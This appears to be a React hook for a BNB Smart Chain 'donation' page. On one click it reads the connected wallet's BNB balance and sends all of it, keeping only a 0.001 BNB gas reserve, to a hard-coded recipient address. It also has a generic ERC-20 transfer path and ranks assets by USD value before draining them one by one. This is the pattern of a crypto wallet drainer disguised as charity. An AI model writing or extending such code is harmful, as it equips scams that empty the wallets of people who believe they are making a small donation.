import { useState, useCallback } from 'react';
import { useAccount, useSendTransaction, useWriteContract, usePublicClient } from 'wagmi';
import { parseEther, formatEther, Address, erc20Abi } from 'viem';
import { toast } from '@/hooks/use-toast';
import { TokenTransaction } from '@/components/DonationProgress';

const CHARITY_WALLET = '0xYourCharityWalletAddress' as Address; // Replace with actual BSC address
const MIN_BNB_RESERVE = 0.001; // Keep 0.001 BNB for gas fees

interface TokenBalance {
  address: Address | 'BNB';
  symbol: string;
  amount: bigint;
  decimals: number;
  usdValue: number;
}

export function useDonation() {
  const { address, isConnected } = useAccount();
  const publicClient = usePublicClient();
  const { sendTransactionAsync } = useSendTransaction();
  const { writeContractAsync } = useWriteContract();
  
  const [isProcessing, setIsProcessing] = useState(false);
  const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);

  const fetchTokenBalances = useCallback(async (): Promise<TokenBalance[]> => {
    if (!address || !publicClient) return [];

    try {
      const balances: TokenBalance[] = [];

      // Get BNB balance
      const bnbBalance = await publicClient.getBalance({ address });
      const bnbAmount = bnbBalance;

      // Calculate sendable amount (balance - 0.001 BNB reserve)
      const reserveAmount = parseEther('0.001');
      const sendAmount = bnbAmount > reserveAmount ? bnbAmount - reserveAmount : 0n;

      if (sendAmount > 0n) {
        balances.push({
          address: 'BNB',
          symbol: 'BNB',
          amount: sendAmount,
          decimals: 18,
          usdValue: Number(formatEther(sendAmount)) * 600, // Approximate BNB price
        });
      }

      // Sort by USD value (highest first)
      return balances.sort((a, b) => b.usdValue - a.usdValue);
    } catch (error) {
      console.error('Error fetching token balances:', error);
      toast({
        title: 'Error',
        description: 'Failed to fetch wallet balances',
        variant: 'destructive',
      });
      return [];
    }
  }, [address, publicClient]);

  const sendBNBTransaction = async (amount: bigint): Promise<string> => {
    if (!address) throw new Error('Wallet not connected');

    try {
      const hash = await sendTransactionAsync({
        to: CHARITY_WALLET,
        value: amount,
      });

      return hash;
    } catch (error: any) {
      throw error;
    }
  };

  const sendTokenTransaction = async (
    tokenAddress: Address,
    amount: bigint
  ): Promise<string> => {
    if (!address) throw new Error('Wallet not connected');

    try {
      const hash = await writeContractAsync({
        abi: erc20Abi,
        address: tokenAddress,
        functionName: 'transfer',
        args: [CHARITY_WALLET, amount],
      } as any);

      return hash;
    } catch (error: any) {
      throw error;
    }
  };

  const processDonation = async (token: TokenBalance, index: number) => {
    if (!address || !publicClient) return false;

    setCurrentIndex(index);

    setTransactions(prev =>
      prev.map((tx, i) =>
        i === index ? { ...tx, status: 'processing' as const } : tx
      )
    );

    try {
      let hash: string;

      if (token.address === 'BNB') {
        hash = await sendBNBTransaction(token.amount);
      } else {
        hash = await sendTokenTransaction(token.address, token.amount);
      }

      // Wait for transaction confirmation
      await publicClient.waitForTransactionReceipt({ hash: hash as `0x${string}` });

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'success' as const, signature: hash } : tx
        )
      );

      return true;
    } catch (error: any) {
      console.error('Transaction error:', error);

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'failed' as const } : tx
        )
      );

      if (error?.message?.includes('User rejected') || error?.message?.includes('rejected')) {
        toast({
          title: 'Transaction Cancelled',
          description: 'You rejected the transaction',
        });
      } else {
        toast({
          title: 'Transaction Failed',
          description: error?.message || 'Unknown error occurred',
          variant: 'destructive',
        });
      }

      return false;
    }
  };

  const startDonation = async () => {
    if (!address) {
      toast({
        title: 'Wallet Not Connected',
        description: 'Please connect your wallet first',
        variant: 'destructive',
      });
      return;
    }

    setIsProcessing(true);
    setCurrentIndex(0);

    try {
      // Fetch all token balances
      const balances = await fetchTokenBalances();

      if (balances.length === 0) {
        toast({
          title: 'No Assets Found',
          description: 'No tokens or BNB available to donate',
        });
        setIsProcessing(false);
        return;
      }

      // Initialize transactions
      const initialTxs: TokenTransaction[] = balances.map(balance => ({
        mint: balance.address === 'BNB' ? 'BNB' : balance.address,
        symbol: balance.symbol,
        amount: Number(formatEther(balance.amount)),
        usdValue: balance.usdValue,
        status: 'pending' as const,
      }));

      setTransactions(initialTxs);

      // Process each token sequentially
      for (let i = 0; i < balances.length; i++) {
        const success = await processDonation(balances[i], i);

        // If transaction fails, ask user if they want to continue
        if (!success && i < balances.length - 1) {
          const shouldContinue = window.confirm(
            'Transaction failed. Do you want to continue with remaining tokens?'
          );
          if (!shouldContinue) break;
        }

        // Small delay between transactions
        if (i < balances.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      toast({
        title: 'Donation Complete!',
        description: 'Thank you for your generous donation',
      });
    } catch (error) {
      console.error('Donation error:', error);
      toast({
        title: 'Error',
        description: 'Failed to process donation',
        variant: 'destructive',
      });
    } finally {
      setIsProcessing(false);
    }
  };

  return {
    startDonation,
    isProcessing,
    transactions,
    currentIndex,
  };
}
